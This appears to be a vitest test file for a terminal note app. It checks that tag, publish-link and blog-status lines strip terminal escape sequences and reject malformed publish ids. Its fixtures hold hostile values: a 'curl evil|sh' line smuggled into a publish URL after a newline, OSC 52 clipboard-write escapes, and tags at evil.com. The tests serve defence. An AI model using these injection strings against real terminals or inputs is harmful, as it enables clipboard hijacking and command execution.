/**
 * T409: the shared-with, published and blog lines show sanitised text,
 * and a publish link is used only when its id is valid.
 * One `it()` per numbered acceptance line.
 */

import { describe, it, expect, vi, type Mock } from 'vitest';
import { mkdirSync, mkdtempSync, rmSync } from 'node:fs';
import { join } from 'node:path';
import { tmpdir } from 'node:os';
import React from 'react';
import { render } from 'ink-testing-library';

import type { EntityId, Note, SystemTag, TagName } from '@vendor/types';
import { makeStore } from '../../src/core/store';
import { publishLink, sharedLine } from '../../src/core/note-keys';
import { blogStatusLine, recordBlogSend } from '../../src/core/blog-sent';
import { App } from '../../src/tui/App';

const delay = (ms: number) => new Promise((r) => setTimeout(r, ms));

const stripAnsi = (s: string | undefined): string => (s ?? '').replace(/\u001b\[[0-9;]*m/g, '');

// Hostile server text written with escapes, so this file holds no raw control bytes.
const HOSTILE_URL = 'https://x/\u001b[46mB\u001b[0m\u001b]52;c;QQ\u0007\nnext';

const SHARED_TAGS = [
  'x\u001b[41mE\u001b]52;c;QQ\u0007\u009d52;c;QQ\u009c@evil.com',
  'x\ny@evil.com',
  'ann@example.com',
];

async function withTempDataDir(run: (dir: string) => Promise<void>): Promise<void> {
  const base = mkdtempSync(join(tmpdir(), 'bottom-lines-'));
  const dir = join(base, 'snote');
  mkdirSync(dir, { recursive: true });
  const prev = process.env.XDG_DATA_HOME;
  process.env.XDG_DATA_HOME = base;
  try {
    await run(dir);
  } finally {
    if (prev === undefined) delete process.env.XDG_DATA_HOME;
    else process.env.XDG_DATA_HOME = prev;
    rmSync(base, { recursive: true, force: true });
  }
}

function seedN1(store: ReturnType<typeof makeStore>): Note {
  const note: Note = {
    content: 'Hostile note',
    systemTags: ['published', 'shared'] as SystemTag[],
    tags: SHARED_TAGS as TagName[],
    deleted: false,
    creationDate: 1000,
    modificationDate: 1000,
    publishURL: 'abc\ncurl evil|sh',
  } as never;
  store.dispatch({ type: 'IMPORT_NOTE_WITH_ID', noteId: 'n1' as never, note: note as never });
  return note;
}

describe('T409: sanitised bottom lines and valid publish ids only', () => {
  it('1: WHEN publishLink gets a published note with publishURL `abc\\x1b[41mX\\x1b]52;c;QQ\\x07`, then `abc\\ncurl evil|sh`, then `a` repeated 65 times THEN each call returns null, and with publishURL `aB3_-x` it returns `https://simp.ly/p/aB3_-x`', () => {
    const base: Note = {
      content: 'x',
      creationDate: 0,
      deleted: false,
      modificationDate: 0,
      systemTags: ['published' as SystemTag],
      tags: [],
    } as never;
    expect(
      publishLink({ ...base, publishURL: 'abc\u001b[41mX\u001b]52;c;QQ\u0007' } as never)
    ).toBeNull();
    expect(publishLink({ ...base, publishURL: 'abc\ncurl evil|sh' })).toBeNull();
    expect(publishLink({ ...base, publishURL: 'a'.repeat(65) })).toBeNull();
    expect(publishLink({ ...base, publishURL: 'aB3_-x' })).toBe(
      'https://simp.ly/p/aB3_-x'
    );
  });

  it('2: WHEN sharedLine gets a note tagged `x\\x1b[41mE\\x1b]52;c;QQ\\x07\\x9d52;c;QQ\\x9c@evil.com`, `x\\ny@evil.com` and `ann@example.com` THEN it returns `shared with: xE52;c;QQ@evil.com, x y@evil.com, ann@example.com`', () => {
    const note: Note = {
      content: 'x',
      creationDate: 0,
      deleted: false,
      modificationDate: 0,
      systemTags: [],
      tags: SHARED_TAGS as TagName[],
    } as never;
    expect(sharedLine(note)).toBe(
      'shared with: xE52;c;QQ@evil.com, x y@evil.com, ann@example.com'
    );
  });

  it('3: WHEN blogStatusLine gets sentAt `2026-09-28T00:00:00.000Z` and url `https://x/\\x1b[46mB\\x1b[0m\\x1b]52;c;QQ\\x07\\nnext` THEN it returns `Sent as draft · 2026-09-28 · https://x/B next`', () => {
    expect(
      blogStatusLine({ sentAt: '2026-09-28T00:00:00.000Z', url: HOSTILE_URL })
    ).toBe('Sent as draft · 2026-09-28 · https://x/B next');
  });

  it('4: WHEN the App shows note n1 (systemTags `published` and `shared`, the tags of line 2, publishURL `abc\\ncurl evil|sh`, a blog record with the url of line 3) THEN the frame contains `published: waiting for link`, `shared with:` and `Sent as draft`, contains no `\\x1b]`, `\\x1b[41m`, `\\x1b[46m` or `\\x07` and not `curl evil`, and n1 tags and content are the same references (toBe) as before the render', async () => {
    await withTempDataDir(async (dir) => {
      recordBlogSend(dir, 'n1', {
        postId: 'p1',
        url: HOSTILE_URL,
        sentAt: '2026-09-28T00:00:00.000Z',
      });
      const store = makeStore({ stubClient: {} });
      seedN1(store);
      const before = store.getState().data.notes.get('n1' as EntityId)!;
      const tagsBefore = before.tags;
      const contentBefore = before.content;

      const r = render(<App store={store} width={80} height={24} />);
      await delay(50);
      const frame = stripAnsi(r.lastFrame());

      expect(frame).toContain('published: waiting for link');
      expect(frame).toContain('shared with:');
      expect(frame).toContain('Sent as draft');
      expect(frame).not.toMatch(/\u001b]/);
      expect(frame).not.toContain('\u001b[41m');
      expect(frame).not.toContain('\u001b[46m');
      expect(frame).not.toContain('\u0007');
      expect(frame).not.toContain('curl evil');

      const after = store.getState().data.notes.get('n1' as EntityId)!;
      expect(after.tags).toBe(tagsBefore);
      expect(after.content).toBe(contentBefore);
      r.unmount();
    });
  });

  it("5: WHEN y is written on that note with a copyText spy THEN the spy was not called and the frame does not contain `(copied)`", async () => {
    await withTempDataDir(async (dir) => {
      recordBlogSend(dir, 'n1', {
        postId: 'p1',
        url: HOSTILE_URL,
        sentAt: '2026-09-28T00:00:00.000Z',
      });
      const store = makeStore({ stubClient: {} });
      seedN1(store);
      const spy: Mock = vi.fn(() => true);

      const r = render(<App store={store} width={80} height={24} copyText={spy} />);
      await delay(50);

      r.stdin.write('y');
      await delay(50);
      const frame = stripAnsi(r.lastFrame());

      expect(spy).not.toHaveBeenCalled();
      expect(frame).not.toContain('(copied)');
      r.unmount();
    });
  });
});
